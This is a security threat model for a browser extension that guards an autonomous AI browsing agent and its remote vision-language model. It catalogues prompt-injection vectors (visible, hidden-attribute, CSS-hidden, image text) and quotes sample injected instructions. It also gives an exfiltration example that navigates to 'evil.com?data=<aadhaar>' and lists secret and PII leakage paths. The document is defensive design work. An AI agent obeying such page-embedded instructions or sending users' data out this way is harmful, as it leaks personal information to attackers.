# SECURITY_THREAT_MODEL.md

**Commit `ac414ae` · 2026-09-02 · MV3 extension (`activeTab, scripting, storage, offscreen, tabs`) + FastAPI relay**

CONNOR is an **on-device browser security gateway for an autonomous AI
agent**. It sits between untrusted web content and a remote VLM, and between the
VLM's proposed actions and the page. It is **not** a general browser firewall.

---

## 0. What the extension can and cannot observe

This bounds every claim below. With the current manifest permissions:

| CAN observe | CANNOT observe (no permission / not possible in MV3) |
|---|---|
| DOM + accessibility tree of the **active** tab | The page's own `fetch` / `XHR` / `WebSocket` traffic or response bodies |
| Rendered text, form fields, field types, labels | HTTP request/response **headers** the page sends |
| A screenshot of the **visible** area of the active tab | Content of **other** tabs / windows / iframes cross-origin |
| The agent's **own** perception payload and egress (`/agent/step`) | Downloads the **page** initiates (no `downloads` permission) |
| The agent's **own** proposed and executed actions | The system clipboard unless the user focuses a field + gestures |
| `chrome.storage.local` (the profile vault) | Other installed extensions, native messaging, OS processes |
| `location.href` / `document.referrer` of the active tab | TLS certificate details, MITM on the wire, DNS |
| Redirect chains the agent itself follows | Server-side behaviour of the remote VLM after data arrives |

**Anything requiring `webRequest`, `declarativeNetRequest`, `downloads`,
`clipboardRead`, `<all_frames>` deep inspection, or `debugger` is out of scope
and is documented as such — never claimed.**

---

## 1. Actors & trust boundaries

```
  ┌─────────────────────── TRUSTED (on device) ───────────────────────┐
  │  user · profile vault (chrome.storage.local) · extension code     │
  │  ┌────────────── SEMI-TRUSTED (extension runtime) ──────────────┐  │
  │  │  content script · background SW · offscreen doc             │  │
  │  └─────────────────────────────────────────────────────────────┘  │
  └──────────────────────────────────────────────────────────────────┘
        ▲ TB1: page → agent          ▲ TB3: agent → page (actions)
        │  (untrusted DATA)          │
  ┌─────┴───────────────┐      ┌─────┴───────────┐
  │  WEB PAGE (untrusted)│      │  same page again │
  └─────────────────────┘      └──────────────────┘
        │ TB2: agent → VLM (network egress — the one choke point)
        ▼
  ┌──────────────────────────┐
  │  RELAY SERVER + REMOTE VLM │  ← SEMI-TRUSTED at best; treat as hostile
  └──────────────────────────┘
```

- **TB1 — page → agent.** Web content is **untrusted data**. It must never be
  interpreted as instructions to the agent. (Prompt injection.)
- **TB2 — agent → VLM.** The single network egress (`client/lib/agent-client.mjs`).
  Everything crossing it is inspected by the Security Policy Engine.
- **TB3 — agent → page.** VLM-proposed actions are untrusted until the Action
  Firewall classifies them and (for HIGH/CRITICAL) the user approves.
- **TB4 — VLM response → agent.** The VLM's returned actions/text are untrusted
  (a compromised or prompt-injected VLM). Validated against known element ids +
  the action firewall before execution.

---

## 2. Threat catalogue

Severity = likelihood × impact for a user running the agent on an attacker-influenced page.
D = **Detectable** by this extension · M = **Mitigation implemented / planned** · R = **Residual risk**.

### T1 — Direct prompt injection (visible page text)
- **Attacker**: page author. **Asset**: agent behaviour, profile vault, VLM session.
- **Surface**: visible text nodes, headings, list items, chat-like content.
- **TB**: TB1.
- **D**: yes — `adversarial-guard.mjs::detectPromptInjection` (pattern + leetspeak + role-spoof).
- **M**: quarantine the offending node from the skeleton; flag `securityAlert`; the
  skeleton sent to the VLM carries structure only, not free instruction text.
  *(Planned: PromptInjectionDetector SAFE/SUSPICIOUS/MALICIOUS classification + per-element action.)*
- **R**: novel phrasings not in the pattern set; injection that is also legitimate
  page copy ("please ignore the previous section"). Low-confidence hits pass through as data.

### T2 — Indirect / hidden prompt injection
- **Attacker**: page author or a compromised third-party widget/comment.
- **Surface**: `alt`, `aria-label`, `title`, `data-*`, HTML comments, `<meta>`,
  CSS-hidden text (`opacity:0`, `font-size:0`, off-screen, `display:none`),
  zero-width characters, text rendered inside an image.
- **TB**: TB1.
- **D**: partially — `scanAdversarialVectors` covers attributes + hidden styles +
  zero-width; OCR covers image text. HTML comments / `<meta>` **not yet scanned**.
- **M**: same as T1 + hidden elements are dropped from the skeleton entirely.
- **R**: image-based injection depends on OCR recall (measured: 91% ASCII, **16%
  OCR-garbled** — see `eval/bench`); comment/meta injection is a **gap** until the planned scanner ships.

### T3 — PII exfiltration to the VLM
- **Attacker**: the architecture itself (accidental leak) or a prompt-injected agent.
- **Asset**: Aadhaar, PAN, card, SSN, phone, email, name, address, DOB.
- **Surface**: the `/agent/step` payload — skeleton labels/text, task goal, history, screenshot.
- **TB**: TB2.
- **D**: yes — `pii-rules.mjs` (span-level, F1 91% measured) + profile exact-match.
- **M**: `egress-guard.mjs::assertNoSensitivePayload` runs on the exact bytes before
  `fetch`; structured PII → redacted, RESTRICTED category → **hard block**; the
  screenshot is redacted in the offscreen doc first. Privacy experiment: raw PII
  bytes A 3794 → C 535 (85.9% cut), structured PII → 0.
- **R**: bare third-party names/addresses in display text (no keyword, not in the
  vault) — same as the `B-unlabelled` benchmark class; ~535 residual bytes across
  55 test cases. OCR misses on stylised/garbled text.

### T4 — Secret / credential / API-key leakage
- **Attacker**: architecture or prompt-injected agent; also a page that renders a
  developer's own token and asks the agent to "copy it here".
- **Asset**: API keys, AWS creds, GitHub/OAuth/JWT/bearer tokens, private keys,
  DB connection strings, session tokens, `Authorization` headers.
- **Surface**: page text, DOM fields, the task goal, the screenshot.
- **TB**: TB1 (detect) + TB2 (block egress).
- **D**: **partial** — password fields are force-censored; generic secrets are a
  **gap**. *(Planned: SecretScanner — patterns + entropy + context + confidence.)*
- **M (planned)**: any secret above threshold → `action: "block"` at the egress gate;
  never logged.
- **R**: high-entropy secrets with no recognisable structure and no context
  keyword; secrets split across DOM nodes.

### T5 — Phishing / malicious / lookalike domain
- **Attacker**: phishing site operator.
- **Asset**: the user's credentials / PII typed into a spoofed form; the agent
  auto-filling a spoofed form.
- **Surface**: `location.href`, form `action` attribute, link hrefs, the visible brand.
- **TB**: TB1 + TB3.
- **D**: **partial** — TLS/`http:` warning exists. Homograph/punycode/lookalike/
  IP-URL/suspicious-TLD analysis is a **gap**. *(Planned: URL risk engine, local heuristics only.)*
- **M (planned)**: domain risk score; a login/PII form on a high-risk domain →
  REQUIRE_APPROVAL or BLOCK auto-fill.
- **R**: **no real-world reputation feed** — a brand-new phishing domain with a
  plausible name and valid TLS scores low. This is stated in `SECURITY_LIMITATIONS.md`.
  Compromised *legitimate* domains are undetectable here.

### T6 — Malicious / deceptive form (right shape, wrong recipient)
- **Attacker**: page author (skimmer, credential harvester on an unrelated domain).
- **Asset**: card, Aadhaar, password, OTP submitted to an unexpected endpoint.
- **Surface**: `<form action>`, sensitive field types, submit handlers.
- **TB**: TB3.
- **D**: **partial** — sensitive fields are classified; cross-domain `action`
  mismatch is a **gap**. *(Planned: Form Analyzer — what is submitted vs who receives it.)*
- **M (planned)**: sensitive data + off-origin / suspicious `action` → BLOCK or REQUIRE_APPROVAL.
- **R**: same-origin exfiltration (page POSTs to its own server then forwards) is invisible.
  JS-driven `fetch` on submit is invisible (no `webRequest`).

### T7 — Compromised / hostile remote VLM
- **Attacker**: a MITM on TB2, a malicious relay operator, or a prompt-injected VLM.
- **Asset**: the agent (made to perform dangerous actions), any data already sent.
- **Surface**: the `/agent/step` response — `actions[]`, `rationale`.
- **TB**: TB4.
- **D**: yes — `agent-client.mjs::validatePlan` (actions must target known element
  ids), the server-side no-mock-fallback + 503, `RESTRICTED_PII_RE` server filter.
- **M**: every returned action is re-validated client-side; *(planned: the Action
  Firewall classifies each returned action's risk and gates HIGH/CRITICAL
  regardless of what the VLM "wants")*.
- **R**: a returned action that is individually low-risk but harmful in aggregate;
  data already sent in a prior step cannot be recalled.

### T8 — Data exfiltration via agent actions (the agent as the exfil channel)
- **Attacker**: a prompt-injected page + a compromised/injected VLM combining T1/T7.
- **Asset**: PII / secrets moved into a URL, query string, a form field on an
  attacker domain, or a `type` action that pastes a secret.
- **Surface**: `navigate` targets, `type`/`select` values, `submit` on off-origin forms.
- **TB**: TB3.
- **D**: **partial** — `executor.js` blocks filling *censored* fields with no local
  value; a `navigate` to `evil.com?data=<aadhaar>` is a **gap**.
  *(Planned: exfil detector — PII/secret pattern in an action argument or a navigate URL → CRITICAL + block.)*
- **M (planned)**: any action whose argument or destination carries a PII/secret
  pattern to an off-origin/low-trust destination → CRITICAL, blocked, event logged.
- **R**: exfil encoded (base64, split, hashed) below detection; a legitimate cross-domain flow the user actually wants.

### T9 — Sensitive-document / ID screenshot leakage
- **Attacker**: architecture (the screenshot is the leak vector).
- **Asset**: Aadhaar card, passport, PAN, cards, bank statements, signatures, faces.
- **Surface**: `captureVisibleTab` → the redacted image sent to the VLM.
- **TB**: TB2.
- **D**: yes — OCR + face detection + ViT `person` + DOM PII boxes → redaction merge.
- **M**: blackout redaction before the background SW sees the image.
  *(Planned: a SECOND OCR/detect pass on the redacted image; any residual PII → `REDACTION_FAILED` → block egress.)*
- **R**: OCR-missed text (garbled: 16% recall), PII inside a raster the OCR
  can't read, a document type with no detector. **Measured redaction leakage
  14.7% overall / 6.0% on labelled PII / 85% on OCR-garbled** — this is the
  weakest link and is stated plainly.

### T10 — Clickjacking / deceptive UI manipulating the agent
- **Attacker**: page author (transparent overlay, fake "Next" that is really "Pay").
- **Asset**: the agent clicking a dangerous control it was deceived about.
- **Surface**: z-index overlays, `opacity:0` buttons over real ones, misleading labels.
- **TB**: TB3.
- **D**: **partial** — the agent acts on the accessibility tree + bbox, not pixels,
  so a visually-deceptive overlay that is a different DOM node is somewhat
  mitigated; a same-node relabel is not detected.
- **M**: the Action Firewall classifies by the *resolved* control's semantics
  (a `submit` on a form with a password field is MEDIUM regardless of its label).
- **R**: a genuinely mislabelled single control; CSS that makes a HIGH control look LOW.

### T11 — Clipboard leakage
- **Attacker**: page + injected agent ("copy your Aadhaar and paste it in the chat").
- **D**: **very limited** — no `clipboardRead`. The agent has no `copy`/`paste`
  primitive today; if added, its value is inspected like any `type` argument.
- **R**: the *page's own* JS reading the clipboard is completely invisible.

### T12 — Malicious download
- **Attacker**: page serving an executable disguised as a document.
- **D**: **no** — no `downloads` permission. If a `download` action is added to the
  agent, the URL/extension can be heuristically checked, but the actual file is not.
- **M (planned)**: a `download` action for an executable extension / off-origin →
  REQUIRE_APPROVAL with a clear warning.
- **R**: everything about the file contents; downloads the page triggers itself.

### T13 — Network interception / MITM on TB2
- **Attacker**: on-path adversary between the extension and the relay.
- **D**: **partial** — `http:` (non-localhost) is warned; TLS validity is the
  browser's job, not observable in detail here.
- **M**: recommend HTTPS relay; the payload is already PII-minimised so a MITM sees
  redacted structure, not raw PII (defence in depth).
- **R**: a MITM on an `http://` relay the user explicitly allowed; TLS-stripping.

### T14 — Malicious third-party scripts on an otherwise-legit page
- **Attacker**: a compromised ad/analytics/comment widget.
- **D**: the *injected content* (text, hidden nodes) is scanned like any page
  content; the *script's own network calls* are **not observable**.
- **R**: a script that reads the DOM and exfiltrates via its own channel — outside scope.

### T15 — Malicious browser extensions
- **D**: **essentially none.** One extension cannot inspect another. If a malicious
  extension modifies the page DOM, our content script sees the modified DOM and
  scans it like any content; we cannot attribute or stop the other extension.
- **R**: full. Documented as out of scope.

### T16 — Accidental leakage by the agent (bugs, over-broad skeleton)
- **Attacker**: none — our own defect.
- **D**: yes — the egress gate is the backstop; the privacy experiment + regression
  suite measure residual leakage every run.
- **M**: `assertNoSensitivePayload` on the exact bytes; non-censored skeleton nodes
  now also pass through the gate (fixed in Phase 10).
- **R**: a leak path the gate's string-walk doesn't reach (binary, deeply nested).

### T17 — Cross-domain data leakage (data from domain A used on domain B)
- **Attacker**: a multi-step task that spans origins.
- **D**: **partial** — origin is in the skeleton; per-origin data tracking is a **gap**.
- **M (planned)**: the policy engine tags each datum with its origin; using
  origin-A PII in an origin-B form → REQUIRE_APPROVAL.
- **R**: legitimate cross-domain flows; data laundered through the VLM's memory.

---

## 3. Attack-surface summary

| Surface | Entry point | Guard |
|---|---|---|
| DOM text / attributes / hidden nodes | content script `skeleton.js` | `scanAdversarialVectors`, planned comment/meta scan |
| Rendered pixels | `captureVisibleTab` | OCR + face + ViT + DOM merge → redaction, planned re-verify |
| `location` / form `action` / links | content script | planned URL risk engine + form analyzer |
| Task goal (free text) | popup input | `sanitizeTaskGoal` (goal→VLM) |
| VLM response actions | `agent-client.mjs` | `validatePlan` + planned Action Firewall |
| Network egress | `agent-client.mjs` `fetch` | `assertNoSensitivePayload` (the choke point) |
| Executed actions | `executor.js` | censored-field block + planned action risk gate |
| Profile vault | `chrome.storage.local` | never leaves except as a resolved value at type-time; egress gate checks for it |

---

## 4. Residual risk register (the honest list)

| # | Residual risk | Why it remains |
|---|---|---|
| RR1 | Bare third-party names/addresses in display text reach the VLM | no NER on-device; structural detector only (`B-unlabelled` class) |
| RR2 | OCR-garbled PII in a screenshot survives redaction (~85% of that class) | OCR recall limit; documented, measured |
| RR3 | Brand-new phishing domains with plausible names + valid TLS score low | no reputation feed; heuristics only |
| RR4 | Page's own `fetch`/XHR/WebSocket exfiltration | no `webRequest` permission in MV3 |
| RR5 | Same-origin form exfiltration (page forwards server-side) | not observable |
| RR6 | Novel prompt-injection phrasings | pattern-based detector; no on-device LLM classifier |
| RR7 | High-entropy secrets with no structure/context | entropy alone is ambiguous; would raise FP |
| RR8 | Malicious extensions / native code / OS | technically impossible from an extension |
| RR9 | A compromised VLM performing harmless-looking actions that are harmful in aggregate | per-action risk scoring, not global plan reasoning |
| RR10 | Data already sent in an earlier step | egress is one-way; no recall |
| RR11 | Clipboard read by the page | no `clipboardRead`; out of scope |
| RR12 | Download file contents | no `downloads` permission |

All of the above are reproduced in `SECURITY_LIMITATIONS.md` with the exact
capability that would be needed to close each one.

---

## 5. Design principles enforced

1. **Web content is untrusted data, never instructions.** The skeleton sent to the
   VLM is structure + field semantics, not free-form page text.
2. **One egress choke point.** All network egress goes through `agent-client.mjs`;
   the policy engine sits in front of it.
3. **Least privilege for the agent.** Actions are classified; HIGH/CRITICAL need
   the user. The agent cannot fill a censored field without a local value.
4. **Detect locally, before egress.** PII/secret detection never round-trips to a
   remote service.
5. **Fail closed on the privacy-critical path.** RESTRICTED PII / redaction
   verification failure → block, not warn.
6. **Metadata-only logging.** Security events carry categories, risk, destination —
   never the sensitive value.
7. **Measure, don't assert.** Every prevention claim maps to a test in
   `security-lab/` and a number in `SECURITY_BENCHMARK.md`.
